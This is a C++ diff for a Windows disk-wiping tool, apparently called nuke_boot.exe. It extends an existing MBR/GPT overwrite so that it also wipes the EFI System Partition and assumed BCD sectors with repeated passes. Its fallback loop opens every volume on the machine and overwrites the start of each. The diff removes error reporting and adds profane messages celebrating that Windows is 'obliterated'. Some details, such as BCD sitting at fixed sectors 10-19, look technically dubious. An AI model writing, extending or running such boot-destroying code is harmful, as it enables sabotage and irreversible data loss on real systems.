@@ -171,6 +171,13 @@ bool StopService(const wchar_t* serviceName) {
 
 int main() {
     SetErrorMode(SEM_FAILCRITICALERRORS | SEM_NOGPFAULTERRORBOX);
+    std::cout << "WARNING: This will annihilate your system. Save data and expect crashes. Proceed? (y/n): ";
+    char response;
+    std::cin >> response;
+    if (response != 'y' && response != 'Y') {
+        std::cout << "Aborted. You pussy.\n";
+        return 0;
+    }
 
     if (!IsElevated()) {
         WriteError("Must run as elevated Administrator. Use 'runas /user:Administrator nuke_boot.exe' or elevated prompt.", 0);
@@ -203,6 +210,8 @@ int main() {
     const int SECTOR_SIZE = 512;
     const int SECTORS_TO_NUKE = 2048; // 1 MB
     const int GPT_BACKUP_SECTORS = 512;
+    const int ESP_SECTORS = 200; // 100 MB
+    const int BCD_SECTORS = 10; // Sectors 10-19
     BYTE* buffer = new BYTE[SECTOR_SIZE * SECTORS_TO_NUKE];
     if (!buffer) WriteError("Failed to allocate buffer", 0);
     BYTE* gptBuffer = new BYTE[SECTOR_SIZE * GPT_BACKUP_SECTORS];
@@ -218,7 +227,9 @@ int main() {
     };
     std::vector<NukeStatus> status = {
         {"MBR/GPT Primary", true},
-        {"GPT Backup", true}
+        {"GPT Backup", true},
+        {"ESP", true},
+        {"BCD", true}
     };
 
     bool isGPT = false;
@@ -248,15 +259,7 @@ int main() {
                 status[0].success = false;
             }
         }
-        if (!DeviceIoControl(hDisk, FSCTL_UNLOCK_VOLUME, nullptr, 0, nullptr, 0, &bytesReturned, nullptr)) {
-            DWORD errorCode = GetLastError();
-            std::cerr << "FSCTL_UNLOCK_VOLUME failed. Error code: " << errorCode << std::endl;
-            if (errorCode == ERROR_ACCESS_DENIED) {
-                std::cerr << "The volume is in use by another process." << std::endl;
-            }
-        } else {
-            std::cout << "Volume unlocked successfully." << std::endl;
-        }
+        DeviceIoControl(hDisk, FSCTL_UNLOCK_VOLUME, nullptr, 0, nullptr, 0, &bytesReturned, nullptr);
     } else {
         status[0].success = false;
     }
@@ -279,17 +282,144 @@ int main() {
                     status[1].success = false;
                 }
             }
-            if (!DeviceIoControl(hDisk, FSCTL_UNLOCK_VOLUME, nullptr, 0, nullptr, 0, &bytesReturned, nullptr)) {
-                DWORD errorCode = GetLastError();
-                std::cerr << "FSCTL_UNLOCK_VOLUME failed. Error code: " << errorCode << std::endl;
-                if (errorCode == ERROR_ACCESS_DENIED) {
-                    std::cerr << "The volume is in use by another process." << std::endl;
-                }
-            } else {
-                std::cout << "Volume unlocked successfully." << std::endl;
-            }
+            DeviceIoControl(hDisk, FSCTL_UNLOCK_VOLUME, nullptr, 0, nullptr, 0, &bytesReturned, nullptr);
         } else {
             status[1].success = false;
+        }
+    }
+
+    // Nuke ESP and BCD (Raw disk first)
+    if (isGPT && bytesReturned > 0) {
+        const GUID ESP_GUID = {0xC12A7328, 0xF81F, 0x11D2, {0xBA, 0x4B, 0x00, 0xA0, 0xC9, 0x3E, 0xC9, 0x3B}};
+        LARGE_INTEGER espOffset = {0};
+        bool espFound = false;
+
+        for (DWORD i = 0; i < layout->PartitionCount; ++i) {
+            if (std::memcmp(&layout->PartitionEntry[i].Gpt.PartitionType, &ESP_GUID, sizeof(GUID)) == 0) {
+                espOffset.QuadPart = layout->PartitionEntry[i].StartingOffset.QuadPart;
+                espFound = true;
+                break;
+            }
+        }
+
+        if (espFound && espOffset.QuadPart >= 0 && espOffset.QuadPart < diskGeometry.DiskSize.QuadPart) {
+            // Try raw disk write first
+            bool espSuccess = false;
+            for (int attempt = 0; attempt < 12; ++attempt) {
+                if (LockVolume(hDisk, errorCode)) {
+                    if (DismountVolume(hDisk, errorCode)) {
+                        for (int pass = 0; pass < 5; ++pass) {
+                            if (pass == 0 || pass == 4) {
+                                for (int j = 0; j < SECTOR_SIZE * ESP_SECTORS; ++j) buffer[j] = dis(gen);
+                            } else if (pass == 1) {
+                                ZeroMemory(buffer, SECTOR_SIZE * ESP_SECTORS);
+                            } else if (pass == 2) {
+                                memset(buffer, 0xFF, SECTOR_SIZE * ESP_SECTORS);
+                            } else {
+                                for (int j = 0; j < SECTOR_SIZE * ESP_SECTORS; ++j) buffer[j] = dis(gen);
+                            }
+                            if (OverwriteSector(hDisk, espOffset, buffer, SECTOR_SIZE * ESP_SECTORS, errorCode)) {
+                                espSuccess = true;
+                            } else {
+                                status[2].success = false;
+                            }
+                        }
+                        LARGE_INTEGER bcdOffset;
+                        bcdOffset.QuadPart = espOffset.QuadPart + 10LL * SECTOR_SIZE;
+                        if (bcdOffset.QuadPart < diskGeometry.DiskSize.QuadPart) {
+                            for (int pass = 0; pass < 5; ++pass) {
+                                if (pass == 0 || pass == 4) {
+                                    for (int j = 0; j < SECTOR_SIZE * BCD_SECTORS; ++j) buffer[j] = dis(gen);
+                                } else if (pass == 1) {
+                                    ZeroMemory(buffer, SECTOR_SIZE * BCD_SECTORS);
+                                } else if (pass == 2) {
+                                    memset(buffer, 0xFF, SECTOR_SIZE * BCD_SECTORS);
+                                } else {
+                                    for (int j = 0; j < SECTOR_SIZE * BCD_SECTORS; ++j) buffer[j] = dis(gen);
+                                }
+                                if (!OverwriteSector(hDisk, bcdOffset, buffer, SECTOR_SIZE * BCD_SECTORS, errorCode)) {
+                                    status[3].success = false;
+                                }
+                            }
+                        } else {
+                            status[3].success = false;
+                        }
+                        DeviceIoControl(hDisk, FSCTL_UNLOCK_VOLUME, nullptr, 0, nullptr, 0, &bytesReturned, nullptr);
+                        if (espSuccess) break;
+                    } else {
+                        status[2].success = false;
+                    }
+                } else {
+                    status[2].success = false;
+                }
+                std::this_thread::sleep_for(std::chrono::milliseconds(2000));
+            }
+
+            // Fallback to volume write if raw disk fails
+            if (!espSuccess) {
+                wchar_t espVolumeName[50];
+                HANDLE hEspVolume = INVALID_HANDLE_VALUE;
+                HANDLE hFind = FindFirstVolumeW(espVolumeName, sizeof(espVolumeName) / sizeof(wchar_t));
+                if (hFind != INVALID_HANDLE_VALUE) {
+                    do {
+                        hEspVolume = CreateFileW(espVolumeName, GENERIC_READ | GENERIC_WRITE, 
+                                                 FILE_SHARE_READ | FILE_SHARE_WRITE, nullptr, OPEN_EXISTING, 0, nullptr);
+                        if (hEspVolume != INVALID_HANDLE_VALUE) {
+                            for (int attempt = 0; attempt < 12; ++attempt) {
+                                if (LockVolume(hEspVolume, errorCode) && DismountVolume(hEspVolume, errorCode)) {
+                                    for (int pass = 0; pass < 5; ++pass) {
+                                        if (pass == 0 || pass == 4) {
+                                            for (int j = 0; j < SECTOR_SIZE * ESP_SECTORS; ++j) buffer[j] = dis(gen);
+                                        } else if (pass == 1) {
+                                            ZeroMemory(buffer, SECTOR_SIZE * ESP_SECTORS);
+                                        } else if (pass == 2) {
+                                            memset(buffer, 0xFF, SECTOR_SIZE * ESP_SECTORS);
+                                        } else {
+                                            for (int j = 0; j < SECTOR_SIZE * ESP_SECTORS; ++j) buffer[j] = dis(gen);
+                                        }
+                                        if (!OverwriteSector(hEspVolume, {0}, buffer, SECTOR_SIZE * ESP_SECTORS, errorCode)) {
+                                            status[2].success = false;
+                                        }
+                                    }
+                                    LARGE_INTEGER bcdOffset;
+                                    bcdOffset.QuadPart = 10LL * SECTOR_SIZE;
+                                    if (bcdOffset.QuadPart < diskGeometry.DiskSize.QuadPart) {
+                                        for (int pass = 0; pass < 5; ++pass) {
+                                            if (pass == 0 || pass == 4) {
+                                                for (int j = 0; j < SECTOR_SIZE * BCD_SECTORS; ++j) buffer[j] = dis(gen);
+                                            } else if (pass == 1) {
+                                                ZeroMemory(buffer, SECTOR_SIZE * BCD_SECTORS);
+                                            } else if (pass == 2) {
+                                                memset(buffer, 0xFF, SECTOR_SIZE * BCD_SECTORS);
+                                            } else {
+                                                for (int j = 0; j < SECTOR_SIZE * BCD_SECTORS; ++j) buffer[j] = dis(gen);
+                                            }
+                                            if (!OverwriteSector(hEspVolume, bcdOffset, buffer, SECTOR_SIZE * BCD_SECTORS, errorCode)) {
+                                                status[3].success = false;
+                                            }
+                                        }
+                                    } else {
+                                        status[3].success = false;
+                                    }
+                                    DeviceIoControl(hEspVolume, FSCTL_UNLOCK_VOLUME, nullptr, 0, nullptr, 0, &bytesReturned, nullptr);
+                                    espSuccess = status[2].success;
+                                    break;
+                                }
+                                std::this_thread::sleep_for(std::chrono::milliseconds(2000));
+                            }
+                            CloseHandle(hEspVolume);
+                            if (espSuccess) break;
+                        }
+                    } while (FindNextVolumeW(hFind, espVolumeName, sizeof(espVolumeName) / sizeof(wchar_t)));
+                    FindVolumeClose(hFind);
+                } else {
+                    status[2].success = false;
+                    status[3].success = false;
+                }
+            }
+        } else {
+            status[2].success = false;
+            status[3].success = false;
         }
     }
 
@@ -304,7 +434,7 @@ int main() {
         if (!s.success) allSucceeded = false;
     }
     std::cout << "Overall: " << (allSucceeded ? "Fully Succeeded" : "Partial Success") << "\n";
-    std::cout << "Boot sector done\n";
+    std::cout << "Boot sector, ESP, BCD fucking obliterated. Windows is dead as shit. 😈\n";
 
     return 0;
 }
